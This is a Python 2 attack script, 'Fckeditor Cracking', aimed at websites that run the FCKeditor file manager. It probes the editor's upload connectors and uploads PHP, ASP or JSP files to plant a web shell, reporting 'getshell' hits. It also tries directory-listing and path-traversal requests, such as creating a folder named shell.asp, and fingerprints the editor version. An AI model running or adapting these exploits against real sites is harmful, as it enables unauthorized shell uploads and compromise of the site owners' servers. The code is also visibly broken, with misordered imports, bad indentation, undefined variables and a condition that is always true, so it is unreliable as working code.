#!/usr/bin/env python
#coding = utf-8
sys.path.append("plugin/")
import lib
import re
import urllib
import urllib2
import os
import sys
import httplib
#import color_pr
import time
from poster.streaminghttp import register_openers
from poster.encode import multipart_encode
global url,resp

def response(rurl,path_name):
    #params = urllib.urlencode({"Demon":"test"})
    #headers = {"Content-type":"application/x-www-form-urlencoded"}
    #conn = httplib.HTTPConnection(url)
    #conn.request("POST",filename,params,headers)
    #resp = conn.getresponse()
    resp=urllib.urlopen(rurl,path_name)
    return resp

def shell_handler():
    if response(url,"editor/filemanager/upload/php/upload.php").getcode() == 200:
        upload_url = url+"editor/filemanager/upload/php/upload.php?Type=Media"
        try:
            resp=upload(upload_url,'NewFile','testphp.php')
            resp_url=re.findall(r'\(.*php","',resp)[0][6:-3]
            if response(url,resp_url).getcode() == 200:
                print "[!]Maybe getshell==>\n"+url+resp

        except:
            pass
        #<inputtype="file" name="NewFile" size="50"><br>
        #        <input id="btnUpload" type="submit" value="Upload">
        #        </form>
    elif response(url,"editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/").getcode() == 200:
        upload_url = url+"editor/filemanager/browser/default/connectors/php/connector.php?Command=FileUpload&Type=File&CurrentFolder=/"
        try:
            resp=upload(upload_url,'NewFile','testphp.php')
            resp_url=re.findall(r'\(.*php',resp)
            if resp_url[0][1:].split(',"')[0] == 201:
                print  "[!]Maybe getshell==>\n"+url+'userfiles/file/'+resp_url[0][1:].split(',"')[1]
        except:
            pass


    elif response(url,"editor/filemanager/browser/default/browser.html").getcode() == 200:
        upload_url = url+"editor/filemanager/browser/default/browser.html?Type=demon&Connector=connectors/asp/connector.asp"
        try:
            upload(upload_url,'Newfile','testasp.asp')
            if response(url,'userfiles/demon/testasp.asp').getcode() == 200:
                print  "[!]Maybe getshell==>\n"+url+'userfiles/demon/testasp.asp'
        except:
            pass

    elif response(url,"/editor/filemanager/upload/asp/upload.asp?Type=Image").getcode() == 200:
        upload_url = url+"/editor/filemanager/upload/asp/upload.asp?Type=Image"
        try:
            upload(upload_url,'Newfile',"test.asp")
            resp_url=re.findall(r'\(.*asp","',resp)[0][6:-3]
            if response(url,resp_url).getcode() == 200:
                print "[!]Maybe getshell==>\n"+url+resp_url
        except:
            pass

    elif response(url,"editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp").getcode() == 200:
        upload_url = url+"editor/filemanager/browser/default/browser.html?Type=Image&Connector=connectors/jsp/connector.jsp"
        try:
            upload(upload_url,'Newfile','testjsp.jsp')
            if response(url,'userfiles/image/testjsp.jsp').getcode() == 200:
                print "[!]Maybe getshell==>\n"+url+'userfiles/image/testjsp.jsp'
        except:
            pass


    else:
        pass

def upload(upload_url,params,filename):
    ##opener = poster.streaminghttp.register_openers()
    #opener.add_handler(urllib2.HTTPCookieProcessor(cookielib.CookieJar()))
    #params = {'file': open("sysinfo.asp", "rb"), 'name': 'NewFile'}
    #datagen, headers = poster.encode.multipart_encode(params)
    #request = urllib2.Request(upload_url, datagen, headers)
    #result = urllib2.urlopen(request)
    register_openers()
    datagen, headers = multipart_encode({params: open(filename, "rb")})
    request = urllib2.Request(upload_url, datagen, headers)
    resp= urllib2.urlopen(request).read()
    return resp


def index_of():
    index_urls = ['editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F','editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=%2F','editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../..%2F&NewFolderName=shell.asp']
    index_dics = ['Index of','parent dictionary']
    for index_url in index_urls:
        html = urllib.urlopen(url+index_url)
        for index_dic in index_dics:
            pattern = re.compile(index_dic)
            match = html.search(pattern)
            if match:
                print "[!]Fckeditor with a dic xday==>\n"+index_dic+'\n'

def xpath():
    xpath_dics =['editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/shell.asp','editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&Type=File&CurrentFolder=%2F&NewFolderName=aux']
    for xpath_dic in xpath_dics:
        html= urllib.urlopen(url+xpath_dic)
        pattern = re.compile('<p>.*,')
        match = html.search(pattern)
        if match:
            print "[!]Fckeditor xpath may be"+match.group(0)[3,-1]


def info_gather():
    ver_dic={'editor/dialog/fck_about.html':['<b>.*</b><br','4','-7'],'_whatsnew.html':['Ver.*</h3','0','-4'],'editor/_source/fckeditorapi.js':['Version.*,"V','0','-2'],'editor/js/fckeditorcode_gecko.js':['Version.*",V','0','-2'],'editor/js/fckeditorcode_ie.js':['Version.*",V','0','-2']}
    for key in ver_dic:
            html = urllib.urlopen(site+dic+key)
        pattern = re.compile(ver_dic[key][0])
        match = re.search(pattern,html)
        if match:
            print "[!]Fckeditor ===>"+match.group(0)[ver_dic[key][1]:ver_dic[key][2]]
        else:
            print "[x]Info_gather failed."
    

if __name__ == "__main__":
    #print sys.argv[1]
    site = sys.argv[1]
    url="http://"+site
    print "||===>url:"+url+"====Fckeditor Cracking====>\n"
    resp = response(url,"")
    if resp.status == 403 or 200:
        shell_handler()
        index_of()
        xpath()
        info_gather()
    else:
        pass
	#print color_pr.yellow("[!]Sorry,<"+site+">may be no chance!")
